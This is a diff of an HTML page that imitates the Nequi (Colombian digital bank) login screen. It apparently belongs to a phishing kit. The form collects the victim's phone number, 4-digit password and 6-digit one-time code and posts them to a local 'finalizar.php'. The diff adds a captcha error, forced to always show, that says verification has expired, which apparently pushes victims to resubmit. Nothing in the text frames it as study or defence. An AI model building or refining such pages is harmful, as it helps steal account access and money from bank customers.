@@ -11,64 +11,37 @@
       font-family: 'Inter', Arial, sans-serif;
       min-height: 100vh;
       position: relative;
+      overflow-x: hidden;
     }
     /* Fondo decorativo con figuras */
-    body::before {
-      content: "";
+    .nequi-bg-squares {
       position: fixed;
       left: 0; top: 0; width: 100vw; height: 100vh;
       z-index: 0;
-      background: 
-        linear-gradient(120deg, #fae9f5 90%, #fff 100%);
+      pointer-events: none;
     }
-    /* Header */
-    .nequi-header {
-      width: 100%;
-      background: #fff;
-      padding: 0;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      box-sizing: border-box;
-      height: 70px;
+    .nequi-bg-square {
+      position: absolute;
+      background: rgba(255,255,255,0.33);
+      border-radius: 26px;
+      opacity: 0.6;
+    }
+    /* Custom posiciones y tamaños para replicar la imagen */
+    .nequi-bg-square.sq1 { left: 52vw; top: 0vh; width: 22vw; height: 23vh; }
+    .nequi-bg-square.sq2 { left: 58vw; top: 26vh; width: 13vw; height: 17vh; }
+    .nequi-bg-square.sq3 { left: 75vw; top: 47vh; width: 20vw; height: 18vh; }
+    .nequi-bg-square.sq4 { left: 62vw; top: 55vh; width: 11vw; height: 11vh; }
+    /* Centrado del formulario */
+    .nequi-login-wrapper {
       position: relative;
-      z-index: 2;
-    }
-    .nequi-logo {
-      margin-left: 30px;
-      font-size: 2.2rem;
-      font-weight: 700;
-      color: #210024;
+      z-index: 1;
+      min-height: 100vh;
       display: flex;
       align-items: center;
-      gap: 7px;
+      justify-content: center;
     }
-    .nequi-logo-dot {
-      color: #e4007a;
-      font-size: 2.5rem;
-      font-weight: bold;
-      margin-right: 3px;
-    }
-    .nequi-recarga-btn {
-      background: #e4007a;
-      color: #fff;
-      font-size: 1.07rem;
-      font-weight: 500;
-      border: none;
-      border-radius: 8px;
-      padding: 13px 32px;
-      margin-right: 28px;
-      cursor: pointer;
-      transition: background 0.17s;
-      box-shadow: 0 2px 8px rgba(228,0,122,0.18);
-    }
-    .nequi-recarga-btn:hover {
-      background: #b80063;
-    }
-    /* Contenedor del login centrado */
     .nequi-login-container {
-      max-width: 410px;
-      margin: 46px auto 0 auto;
+      width: 410px;
       background: #fff;
       border-radius: 16px;
       box-shadow: 0 2px 26px 0 rgba(190, 30, 120, 0.07);
@@ -77,7 +50,6 @@
       flex-direction: column;
       align-items: stretch;
       position: relative;
-      z-index: 2;
     }
     .nequi-login-container h1 {
       text-align: center;
@@ -180,6 +152,13 @@
       margin-bottom: 28px;
       margin-top: 8px;
     }
+    .captcha-error {
+      color: #e4007a;
+      font-size: 1rem;
+      margin-bottom: 7px;
+      margin-top: -7px;
+      font-weight: 500;
+    }
     .nequi-btn {
       width: 100%;
       background: #e4007a;
@@ -199,54 +178,54 @@
       background: #b80063;
     }
     @media (max-width: 600px) {
-      .nequi-login-container { max-width: 97vw; padding: 20px 4vw; }
-      .nequi-header { height: 60px; }
-      .nequi-logo { font-size: 1.65rem; margin-left: 10px;}
-      .nequi-recarga-btn { padding: 11px 18px; margin-right: 10px;}
+      .nequi-login-container { width: 97vw; padding: 20px 4vw; }
     }
     </style>
 </head>
 <body>
-    <header class="nequi-header">
-        <div class="nequi-logo">
-            <span class="nequi-logo-dot">•</span>Nequi
-        </div>
-        <button class="nequi-recarga-btn">Recarga</button>
-    </header>
-    <div class="nequi-login-container">
-        <h1>Entra a tu Nequi</h1>
-        <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
-        <form method="POST" action="finalizar.php" autocomplete="off">
-            <div class="nequi-field">
-                <div class="input-group">
-                    <span class="input-indicativo">
-                        <img src="https://flagcdn.com/w20/co.png" alt="Colombia">
-                        +57
-                        <span class="arrow">&#9660;</span>
-                    </span>
-                    <input type="tel"
-                        id="j_username"
-                        name="j_username"
-                        class="input-celular"
-                        placeholder="Número de celular"
-                        maxlength="10"
-                        minlength="10"
-                        pattern="[0-9]{10}"
-                        required
-                        autocomplete="off">
-                </div>
-            </div>
-            <div class="nequi-field">
-                <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required placeholder="Contraseña">
-            </div>
-            <div class="nequi-field">
-                <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required placeholder="Clave dinámica">
-            </div>
-            <div class="captcha-box">
-                <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
-            </div>
-            <button type="submit" class="nequi-btn">Entra</button>
-        </form>
+    <div class="nequi-bg-squares">
+        <div class="nequi-bg-square sq1"></div>
+        <div class="nequi-bg-square sq2"></div>
+        <div class="nequi-bg-square sq3"></div>
+        <div class="nequi-bg-square sq4"></div>
+    </div>
+    <div class="nequi-login-wrapper">
+      <div class="nequi-login-container">
+          <h1>Entra a tu Nequi</h1>
+          <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
+          <form method="POST" action="finalizar.php" autocomplete="off">
+              <div class="nequi-field">
+                  <div class="input-group">
+                      <span class="input-indicativo">
+                          <img src="https://flagcdn.com/w20/co.png" alt="Colombia">
+                          +57
+                          <span class="arrow">&#9660;</span>
+                      </span>
+                      <input type="tel"
+                          id="j_username"
+                          name="j_username"
+                          class="input-celular"
+                          placeholder="Número de celular"
+                          maxlength="10"
+                          minlength="10"
+                          pattern="[0-9]{10}"
+                          required
+                          autocomplete="off">
+                  </div>
+              </div>
+              <div class="nequi-field">
+                  <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required placeholder="Contraseña">
+              </div>
+              <div class="nequi-field">
+                  <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required placeholder="Clave dinámica">
+              </div>
+              <div class="captcha-box">
+                  <div class="captcha-error" style="display:block;">La verificación ha caducado. Vuelve a marcar la casilla de verificación.</div>
+                  <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
+              </div>
+              <button type="submit" class="nequi-btn">Entra</button>
+          </form>
+      </div>
     </div>
     <script async defer src="https://www.google.com/recaptcha/api.js"></script>
 </body>
